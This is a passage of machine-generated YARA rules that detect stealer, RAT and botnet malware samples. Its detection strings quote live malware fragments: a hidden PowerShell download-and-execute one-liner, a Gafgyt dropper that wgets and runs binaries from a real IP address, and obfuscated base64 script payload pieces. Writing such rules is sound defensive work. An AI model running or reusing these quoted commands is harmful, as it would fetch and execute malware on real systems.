      $s5 = "OT1GanVR+" fullword ascii /* base64 encoded string '9=FjuQ' */ /* score: '11.00'*/
      $s6 = " %)(5),+5" fullword ascii /* score: '9.00'*/ /* hex encoded string 'U' */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__9a426abe {
   meta:
      description = "dropzone - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_9a426abe.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "9a426abe84ab31f429706450c9e21eef7fe10eae1dbb6cdd9b955279bb6bcefa"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v2.46.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "SecureLogic Systems" fullword wide /* score: '12.00'*/
      $s6 = " SecureLogic Systems 2020 All rights reserved." fullword wide /* score: '12.00'*/
      $s7 = "Data encryption and security" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__e09d75e0 {
   meta:
      description = "dropzone - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_e09d75e0.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "e09d75e0dd40fc0e00282fb2373df150cc46fd3a9a570287ae8fc57793d3ec83"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v2.46.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "4(' <\\=b" fullword ascii /* score: '9.00'*/ /* hex encoded string 'K' */
      $s6 = "QuantumLeap Technologies" fullword wide /* score: '9.00'*/
      $s7 = " QuantumLeap Technologies 2015 All rights reserved." fullword wide /* score: '9.00'*/
      $s8 = "tgXT N* " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__0e3a336c {
   meta:
      description = "dropzone - file Rhadamanthys(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_0e3a336c.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "0e3a336c1b558dc2a6626aa434f1037f8033f0af513c2d58ec9b8a2e97ebe81c"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = "777755556666" ascii /* score: '17.00'*/ /* hex encoded string 'wwUUff' */
      $s5 = " Install System v2.46.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s6 = "%%%.CCCs___j!!!!" fullword ascii /* score: '13.00'*/
      $s7 = "IIII!!!!" fullword ascii /* score: '13.00'*/
      $s8 = "* x^W4j\"" fullword ascii /* score: '9.00'*/
      $s9 = "$&$(5:6?#%$'" fullword ascii /* score: '9.00'*/ /* hex encoded string 'V' */
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__215291a0 {
   meta:
      description = "dropzone - file Rhadamanthys(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_215291a0.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "215291a05497e330d53158b662e4f703d36911998dba06082855019f87375fd6"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v2.46.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "* -]ah" fullword ascii /* score: '13.00'*/
      $s6 = "NlOg[,c" fullword ascii /* score: '9.00'*/
      $s7 = "Integrates diverse technologies seamlessly for innovative solution development." fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__2c0571ed {
   meta:
      description = "dropzone - file Rhadamanthys(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_2c0571ed.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "2c0571ed0f293159b56afa6954cc5ffaf4307c29aca46f3bf041f25b304f10ec"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v2.46.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__54c3465c {
   meta:
      description = "dropzone - file Rhadamanthys(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_54c3465c.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "54c3465c43b7cbfde709e2fe16e842cf8ab43f906c77fc8a759c325ad7cef8a7"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v2.46.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "SafeCloudX Technologies Co." fullword wide /* score: '11.00'*/
      $s6 = " SafeCloudX Technologies Co. 2017 All rights reserved." fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule AsyncRAT_signature__2 {
   meta:
      description = "dropzone - file AsyncRAT(signature).vbs"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "315317e046e7633369e70b5da2055f670a0131d6635a28758fbdb5f98010993d"
   strings:
      $x1 = "yEUjJQQJjUwnYLxVWKUdahZcaAxyCTvqTyMVnoONLlDPtFFEL = yEUjJQQJjUwnYLxVWKUdahZcaAxyCTvqTyMVnoONLlDPtFFEL & \"b24gZXJyb3IgcmVzdW1lIG" ascii /* score: '52.00'*/
      $x2 = "QNm10N3pqaXFYaWxUMUo5UXJxUkxDUmpOZzJEdjRDTm9MdUlzQkc4SUpZRkZVWTdLcGx1ekNYQmdseGN2VXRTTUJpSzl6b2NoSW11YUNXUXBnN0JDeGNKaVBXQmNqa2N" ascii /* base64 encoded string '6mt7zjiqXilT1J9QrqRLCRjNg2Dv4CNoLuIsBG8IJYFFUY7KpluzCXBglxcvUtSMBiK9zochImuaCWQpg7BCxcJiPWBcjkc' */ /* score: '31.00'*/
      $x3 = "kmyHLiRerIJSSGQZGTZycihwGRp = kmyHLiRerIJSSGQZGTZycihwGRp & \"CnNCaWJRdCA9ICIiIA0KZGltIGFtT2xGSUNEb01RVll4TnJtb01jcm1CYmJ6Y3lZQ1" ascii /* score: '31.00'*/
      $s4 = "JWk9KdzhBSnNkY0tsODJrWmc0S2dQRGxhRGdrbTFWV2VyUVZHU3NXcTdpZjdUcXlrT054TG95VnFFdCtwK3pabEliRCszNnFIT0R4cXQ2dkRZdEVDMjlvUTJxTmpTcVd" ascii /* base64 encoded string 'ZOJw8AJsdcKl82kZg4KgPDlaDgkm1VWerQVGSsWq7if7TqykONxLoyVqEt+p+zZlIbD+36qHODxqt6vDYtEC29oQ2qNjSqW' */ /* score: '29.00'*/
      $s5 = "3TUVGQUFJQ0FnQVJSNjFVQUFBQUFBQUFBQUFBQUFBQUNjQUFBQkRiMjVtYVdkMWNtRjBhVzl1Y3pJdllXTmpaV3hsY21GMGIzSXZZM1Z5Y21WdWRDNTRiV3dEQUZCTEJ" ascii /* base64 encoded string 'MEFAAICAgARR61UAAAAAAAAAAAAAAAACcAAABDb25maWd1cmF0aW9uczIvYWNjZWxlcmF0b3IvY3VycmVudC54bWwDAFBLB' */ /* score: '29.00'*/
      $s6 = "xMDEtMTM4KSAmIENoclcoMTI1KzgzLTEyNSkgJiBDaHJXKDgyKzEyMS04MikgJiBDaHJXKDEzMysxMTUtMTMzKSAmIENoclcoMTg5KzExNi0xODkpICYgQ2hyVygyNjk" ascii /* base64 encoded string '01-138) & ChrW(125+83-125) & ChrW(82+121-82) & ChrW(133+115-133) & ChrW(189+116-189) & ChrW(269' */ /* score: '28.00'*/
      $s7 = "jMk1ETXpNRFl3TFZrd2J5d3lOell3TXpNd05Ea3RXVEJ2TERJM05qQXpNekEyTmkxWk1HOHNNamMyTURNek1EVTFMVmt3Ynl3eU56WXdNek13TmpFdFdUQnZMREkzTmp" ascii /* base64 encoded string '2MDMzMDYwLVkwbywyNzYwMzMwNDktWTBvLDI3NjAzMzA2Ni1ZMG8sMjc2MDMzMDU1LVkwbywyNzYwMzMwNjEtWTBvLDI3Nj' */ /* score: '27.00'*/
      $s8 = "jMk1ETXlPVGt3TFZrd2J5d3lOell3TXpNd05qVXRXVEJ2TERJM05qQXpNekEyTmkxWk1HOHNNamMyTURNek1EUTNMVmt3Ynl3eU56WXdNek13TmpRdFdUQnZMREkzTmp" ascii /* base64 encoded string '2MDMyOTkwLVkwbywyNzYwMzMwNjUtWTBvLDI3NjAzMzA2Ni1ZMG8sMjc2MDMzMDQ3LVkwbywyNzYwMzMwNjQtWTBvLDI3Nj' */ /* score: '27.00'*/
      $s9 = "jMk1ETXpNRFV5TFZrd2J5d3lOell3TXpNd05qUXRXVEJ2TERJM05qQXpNekEyTVMxWk1HOHNNamMyTURNek1EVTVMVmt3Ynl3eU56WXdNekk1T0RJdFdUQnZMREkzTmp" ascii /* base64 encoded string '2MDMzMDUyLVkwbywyNzYwMzMwNjQtWTBvLDI3NjAzMzA2MS1ZMG8sMjc2MDMzMDU5LVkwbywyNzYwMzI5ODItWTBvLDI3Nj' */ /* score: '27.00'*/
      $s10 = "Nd05URXRXVEJ2TERJM05qQXpNekEyTUMxWk1HOHNNamMyTURNek1EVXpMVmt3Ynl3eU56WXdNek13TmpZdFdUQnZMREkzTmpBek16QTFOQzFaTUc4c01qYzJNRE15T1R" ascii /* base64 encoded string 'wNTEtWTBvLDI3NjAzMzA2MC1ZMG8sMjc2MDMzMDUzLVkwbywyNzYwMzMwNjYtWTBvLDI3NjAzMzA1NC1ZMG8sMjc2MDMyOT' */ /* score: '27.00'*/
      $s11 = "jMk1ETXpNRFUxTFZrd2J5d3lOell3TXpNd05qRXRXVEJ2TERJM05qQXpNekEyTUMxWk1HOHNNamMyTURNeU9UZ3lMVmt3Ynl3eU56WXdNek13TlRRdFdUQnZMREkzTmp" ascii /* base64 encoded string '2MDMzMDU1LVkwbywyNzYwMzMwNjEtWTBvLDI3NjAzMzA2MC1ZMG8sMjc2MDMyOTgyLVkwbywyNzYwMzMwNTQtWTBvLDI3Nj' */ /* score: '27.00'*/
      $s12 = "Nd05qSXRXVEJ2TERJM05qQXpNekEyTVMxWk1HOHNNamMyTURNek1EWTFMVmt3Ynl3eU56WXdNek13TmpZdFdUQnZMREkzTmpBek1qazRNaTFaTUc4c01qYzJNRE15T1R" ascii /* base64 encoded string 'wNjItWTBvLDI3NjAzMzA2MS1ZMG8sMjc2MDMzMDY1LVkwbywyNzYwMzMwNjYtWTBvLDI3NjAzMjk4Mi1ZMG8sMjc2MDMyOT' */ /* score: '27.00'*/
      $s13 = "Nd05Ua3RXVEJ2TERJM05qQXpNekEyTVMxWk1HOHNNamMyTURNek1EUTRMVmt3Ynl3eU56WXdNek13TlRZdFdUQnZMREkzTmpBek1qazVOaTFaTUc4c01qYzJNRE16TUR" ascii /* base64 encoded string 'wNTktWTBvLDI3NjAzMzA2MS1ZMG8sMjc2MDMzMDQ4LVkwbywyNzYwMzMwNTYtWTBvLDI3NjAzMjk5Ni1ZMG8sMjc2MDMzMD' */ /* score: '27.00'*/
      $s14 = "Nd05EVXRXVEJ2TERJM05qQXpNekEyTWkxWk1HOHNNamMyTURNek1EWTBMVmt3Ynl3eU56WXdNek13TmpFdFdUQnZMREkzTmpBek16QTBPUzFaTUc4c01qYzJNRE16TUR" ascii /* base64 encoded string 'wNDUtWTBvLDI3NjAzMzA2Mi1ZMG8sMjc2MDMzMDY0LVkwbywyNzYwMzMwNjEtWTBvLDI3NjAzMzA0OS1ZMG8sMjc2MDMzMD' */ /* score: '27.00'*/
      $s15 = "jMk1ETXpNRFV4TFZrd2J5d3lOell3TXpNd016UXRXVEJ2TERJM05qQXpNekEyTVMxWk1HOHNNamMyTURNek1ESXdMVmt3Ynl3eU56WXdNek13TlRVdFdUQnZMREkzTmp" ascii /* base64 encoded string '2MDMzMDUxLVkwbywyNzYwMzMwMzQtWTBvLDI3NjAzMzA2MS1ZMG8sMjc2MDMzMDIwLVkwbywyNzYwMzMwNTUtWTBvLDI3Nj' */ /* score: '27.00'*/
   condition:
      uint16(0) == 0x6e6f and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule AsyncRAT_signature__4f7c9d47 {
   meta:
      description = "dropzone - file AsyncRAT(signature)_4f7c9d47.js"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "4f7c9d47a99f660c2e31145336c8e443e57c0143e2024f5e4a7c99e2edc1fc36"
   strings:
      $x1 = "qitySqWxiekwbttHQDusR = \"\" ;gRDdjZLCthbHbIzljGtuiTuuQnEyqe = gRDdjZLCthbHbIzljGtuiTuuQnEyqe + \"TmthYVFhaGNzV013VlV4ckxkID0gIi" ascii /* score: '49.00'*/
      $x2 = "qitySqWxiekwbttHQDusR = qitySqWxiekwbttHQDusR + \"SU5hbmhqeGhIcm5KSGx4YVdvelFZVkFWc0txbllKUVp1akJZR2dJQ0JKID0gIiIgDQpTU1JMTllOY2" ascii /* score: '31.00'*/
      $s3 = "jR1VBUjJWMFZIbHdaUUJUYjJOclpYUlVlWEJsQUVacGJHVlRhR0Z5WlFCVGVYTjBaVzB1UTI5eVpRQlRaWEoyWlhKemFXZHVZWFIxY21VQVEyeHZjMlVBUkdsemNHOXp" ascii /* base64 encoded string 'GUAR2V0VHlwZQBTb2NrZXRUeXBlAEZpbGVTaGFyZQBTeXN0ZW0uQ29yZQBTZXJ2ZXJzaWduYXR1cmUAQ2xvc2UARGlzcG9z' */ /* score: '26.00'*/
      $s4 = "BQUViTUFJQStnQUFBQWdBQUJGeTdpSUFjSE4vQUFBS0NnWnZnQUFBQ2dzSGI0RUFBQW9NT0lzQUFBQUliNElBQUFvTkNYSTBJd0J3YjRNQUFBcHZPQUFBQ205OUFBQUt" ascii /* base64 encoded string 'AEbMAIA+gAAAAgAABFy7iIAcHN/AAAKCgZvgAAACgsHb4EAAAoMOIsAAAAIb4IAAAoNCXI0IwBwb4MAAApvOAAACm99AAAK' */ /* score: '26.00'*/
      $s5 = "hV0ZzYVhwbFEyeHBaVzUwQUdkbGRGOVRjMnhEYkdsbGJuUUFjMlYwWDFOemJFTnNhV1Z1ZEFCblpYUmZWR053UTJ4cFpXNTBBSE5sZEY5VVkzQkRiR2xsYm5RQVFYVjB" ascii /* base64 encoded string 'WFsaXplQ2xpZW50AGdldF9Tc2xDbGllbnQAc2V0X1NzbENsaWVudABnZXRfVGNwQ2xpZW50AHNldF9UY3BDbGllbnQAQXV0' */ /* score: '26.00'*/
      $s6 = "Ldll0ZnJRUmxtcEdoa1ZMWWxSVk1OakFtTWZPVVFGSnJXSXF4Ym9lbHlnQWZYVWd5VkN3R2dHd01ZSFRMQndVaGdPS2NlT3d4bWtOaGlWT3J6UXpPSURMUExkWlRWVGp" ascii /* base64 encoded string 'vYtfrQRlmpGhkVLYlRVMNjAmMfOUQFJrWIqxboelygAfXUgyVCwGgGwMYHTLBwUhgOKceOwxmkNhiVOrzQzOIDLPLdZTVTj' */ /* score: '26.00'*/
      $s7 = "WbVZ5YzJsdmJtbHVad0JHY205dFFtRnpaVFkwVTNSeWFXNW5BRlJ2UW1GelpUWTBVM1J5YVc1bkFGSmxZV1JUZEhKcGJtY0FSRzkzYm14dllXUlRkSEpwYm1jQVYzSnB" ascii /* base64 encoded string 'mVyc2lvbmluZwBGcm9tQmFzZTY0U3RyaW5nAFRvQmFzZTY0U3RyaW5nAFJlYWRTdHJpbmcARG93bmxvYWRTdHJpbmcAV3Jp' */ /* score: '26.00'*/
      $s8 = "QQzloYzIxMk16cGhjSEJzYVdOaGRHbHZiajROQ2p3dllYTnpaVzFpYkhrK0FBREFBQUFNQUFBQVVEY0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUF" ascii /* base64 encoded string 'C9hc212MzphcHBsaWNhdGlvbj4NCjwvYXNzZW1ibHk+AADAAAAMAAAAUDcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' */ /* score: '26.00'*/
      $s9 = "6cXJnbGNtY0JzaUlzeG1OdmJPd1lmYWJsTnZXcE9FQ2JjVEZqS0VTTk1yZW5mc1NzTkZlVHpVVFFQdllnUW1tb2dnUGRnZWtXd2pMbnZuRlZkZGJKWmljSEFwVFBnbHh" ascii /* base64 encoded string 'qrglcmcBsiIsxmNvbOwYfablNvWpOECbcTFjKESNMrenfsSsNFeTzUTQPvYgQmmoggPdgekWwjLnvnFVddbJZicHApTPglx' */ /* score: '26.00'*/
      $s10 = "BQUFHM1EwQUFBQUhPUVlBQUFBR0tGQUFBQXJjS2dFb0FBQUNBRmdBV3JJQURRQUFBQUFBQUJBQTJ1b0FEQUVBQUFFQ0FBZ0E3dllBRFFBQUFBQWJNQU1BVUFBQUFBQUF" ascii /* base64 encoded string 'AAG3Q0AAAAHOQYAAAAGKFAAAArcKgEoAAACAFgAWrIADQAAAAAAABAA2uoADAEAAAECAAgA7vYADQAAAAAbMAMAUAAAAAAA' */ /* score: '26.00'*/
      $s11 = "BQUFnQUFBUkFuczJBQUFFQ2daRkRBQUFBQVVBQUFBRkFBQUFtQUFBQUtBQUFBQU1BQUFBSGdBQUFEQUFBQUJDQUFBQVZBQUFBR1lBQUFCNUFBQUFoZ0FBQURpakFBQUF" ascii /* base64 encoded string 'AAgAAARAns2AAAECgZFDAAAAAUAAAAFAAAAmAAAAKAAAAAMAAAAHgAAADAAAABCAAAAVAAAAGYAAAB5AAAAhgAAADijAAAA' */ /* score: '26.00'*/
      $s12 = "RMjl1WTJGMEFFbHRZV2RsUm05eWJXRjBBR1p2Y20xaGRBQlhjbWwwWlVac2IyRjBBR2RsZEY5QmMwWnNiMkYwQUhObGRGOUJjMFpzYjJGMEFFZGxkRUZ6Um14dllYUUF" ascii /* base64 encoded string '29uY2F0AEltYWdlRm9ybWF0AGZvcm1hdABXcml0ZUZsb2F0AGdldF9Bc0Zsb2F0AHNldF9Bc0Zsb2F0AEdldEFzRmxvYXQA' */ /* score: '26.00'*/
      $s13 = "aVVZ4ZFdGc0FHZGxkRjlKYm5SbGNuWmhiQUJ6WlhSZlNXNTBaWEoyWVd3QVEyeHBaVzUwTGtsdWMzUmhiR3dBYTJWeWJtVnNNekl1Wkd4c0FIVnpaWEl6TWk1a2JHd0F" ascii /* base64 encoded string 'UVxdWFsAGdldF9JbnRlcnZhbABzZXRfSW50ZXJ2YWwAQ2xpZW50Lkluc3RhbGwAa2VybmVsMzIuZGxsAHVzZXIzMi5kbGwA' */ /* score: '26.00'*/
      $s14 = "BRzh5QUFBS2N5Y0FBQW9nRUNjQUFDQ1lPZ0FBYnpJQUFBcHpPd0FBQ2lnUkFBQUdGUDRHSWdBQUJuTTZBQUFLRkJjWGN6c0FBQW9vRmdBQUJpZ0lBQUFHS0FvQUFBWW9" ascii /* base64 encoded string 'G8yAAAKcycAAAogECcAACCYOgAAbzIAAApzOwAACigRAAAGFP4GIgAABnM6AAAKFBcXczsAAAooFgAABigIAAAGKAoAAAYo' */ /* score: '24.00'*/
      $s15 = "1aGdhQllrQ2doaHJBWWtDdndZZ0JZa0NHaHhMQW9FQ21Sc25CY0VDV3hRd0Jja0NjZ2pIQUpFQ3dSdzFCY0VCdWhnL0JaRUN1QXBHQmRrQ294aUVBTmtDMGdnK0FlRUM" ascii /* base64 encoded string 'hgaBYkCghhrAYkCvwYgBYkCGhxLAoECmRsnBcECWxQwBckCcgjHAJECwRw1BcEBuhg/BZECuApGBdkCoxiEANkC0gg+AeEC' */ /* score: '24.00'*/
   condition:
      uint16(0) == 0x5267 and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule b018115f3ccac4d1b0fd586e6ab8da27492cbe53dbaa87a4bf42ef7fd79d0803_b018115f {
   meta:
      description = "dropzone - file b018115f3ccac4d1b0fd586e6ab8da27492cbe53dbaa87a4bf42ef7fd79d0803_b018115f.ps1"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "b018115f3ccac4d1b0fd586e6ab8da27492cbe53dbaa87a4bf42ef7fd79d0803"
   strings:
      $x1 = "powershell -w hidden -ep bypass -c \"do{try{$w=(New-Object Net.WebClient);$w.Headers.Add('X-PS','r5qlqv');iex($w.DownloadString(" ascii /* score: '36.00'*/
      $x2 = "powershell -w hidden -ep bypass -c \"do{try{$w=(New-Object Net.WebClient);$w.Headers.Add('X-PS','r5qlqv');iex($w.DownloadString(" ascii /* score: '35.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 1KB and
      1 of ($x*)
}

rule b0e96f56cf0f1512535b1064c46a51a684d5facb2b7aaba97ea6c4e7dc49076f_b0e96f56 {
   meta:
      description = "dropzone - file b0e96f56cf0f1512535b1064c46a51a684d5facb2b7aaba97ea6c4e7dc49076f_b0e96f56.unknown"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "b0e96f56cf0f1512535b1064c46a51a684d5facb2b7aaba97ea6c4e7dc49076f"
   strings:
      $s1 = "https://runmgov.ru/tixd" fullword wide /* score: '10.00'*/
      $s2 = ">Cftp|q9" fullword ascii /* score: '9.00'*/
      $s3 = "* 0vZZ" fullword ascii /* score: '9.00'*/
      $s4 = "GuSY /L" fullword ascii /* score: '8.00'*/
      $s5 = "cnucoub" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x0000 and filesize < 15000KB and
      all of them
}

rule Mirai_signature__ecf09a4e {
   meta:
      description = "dropzone - file Mirai(signature)_ecf09a4e.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "ecf09a4e4a1fa563ae7e567dbd8ba42157ae83d06cc55638e683a709c9cbb51a"
   strings:
      $s1 = "fake_time" fullword ascii /* score: '9.00'*/
      $s2 = "attack_rawflood" fullword ascii /* score: '9.00'*/
      $s3 = "exploit.c" fullword ascii /* score: '8.00'*/
      $s4 = "exploit_worker" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__bf330ad5 {
   meta:
      description = "dropzone - file Mirai(signature)_bf330ad5.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "bf330ad5c5ed44ab00d4fe869ab0b55154e471760a019678a342d3f5515999a5"
   strings:
      $s1 = "found exec" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Ga_gyt_signature_ {
   meta:
      description = "dropzone - file Ga-gyt(signature).sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "627cd8305e46563aebfeacda7e89efd85276d09cb062f56fa02112169cf5ec91"
   strings:
      $s1 = "(wget http://158.51.126.131/t/mipsel -O- || busybox wget http://158.51.126.131/t/mipsel -O-) > .f; chmod 777 .f; ./.f utt.wget" fullword ascii /* score: '28.00'*/
      $s2 = "(wget http://158.51.126.131/t/armv5l -O- || busybox wget http://158.51.126.131/t/armv5l -O-) > .f; chmod 777 .f; ./.f utt.wget" fullword ascii /* score: '28.00'*/
      $s3 = "(wget http://158.51.126.131/t/powerpc -O- || busybox wget http://158.51.126.131/t/powerpc -O-) > .f; chmod 777 .f; ./.f utt.wget" ascii /* score: '28.00'*/
      $s4 = "(wget http://158.51.126.131/t/armv7l -O- || busybox wget http://158.51.126.131/t/armv7l -O-) > .f; chmod 777 .f; ./.f utt.wget" fullword ascii /* score: '28.00'*/
      $s5 = "(wget http://158.51.126.131/t/armv4l -O- || busybox wget http://158.51.126.131/t/armv4l -O-) > .f; chmod 777 .f; ./.f utt.wget" fullword ascii /* score: '28.00'*/
      $s6 = "(wget http://158.51.126.131/t/mips -O- || busybox wget http://158.51.126.131/t/mips -O-) > .f; chmod 777 .f; ./.f utt.wget" fullword ascii /* score: '28.00'*/
      $s7 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s8 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s9 = "(cp /proc/self/exe .f || busybox cp /bin/busybox .f); > .f; (chmod 777 .f || busybox chmod 777 .f);" fullword ascii /* score: '11.00'*/
      $s10 = ">/home/.a && cd /home" fullword ascii /* score: '11.00'*/
      $s11 = ">/tmp/.a && cd /tmp" fullword ascii /* score: '11.00'*/
      $s12 = ">/var/tmp/.a && cd /var/tmp" fullword ascii /* score: '11.00'*/
      $s13 = ">/dev/.a && cd /dev" fullword ascii /* score: '8.00'*/
      $s14 = ">/var/.a && cd /var" fullword ascii /* score: '8.00'*/
      $s15 = "# gosh that one retard from australia SURE ate his bird" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2023 and filesize < 3KB and
      8 of them
}

rule Ga_gyt_signature__2b6d5bc1 {
   meta:
      description = "dropzone - file Ga-gyt(signature)_2b6d5bc1.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "2b6d5bc145bce17aaabb3e8049e78ae862983a66b01cdcf174a65a14e89112d9"
   strings:
